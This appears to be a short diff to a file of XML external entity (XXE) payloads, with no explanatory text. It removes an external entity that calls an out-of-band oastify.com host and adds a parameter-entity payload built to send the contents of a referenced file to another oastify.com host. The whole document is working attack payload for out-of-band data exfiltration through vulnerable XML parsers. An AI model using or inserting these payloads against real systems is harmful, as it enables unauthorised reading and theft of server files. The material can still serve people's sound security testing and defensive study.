@@ -1,2 +1,1 @@
-<!ENTITY exfil SYSTEM 'http://pxqtugyu5ooiwz6h4n2jxhmhd8jz7yvn.oastify.com;'>
-&exfil;
+<!ENTITY % all "<!ENTITY &#x25; req SYSTEM 'http://yac27pb3ix1r98jqhwfsaqzqqhw8kzbn0.oastify.com/%file;'>">
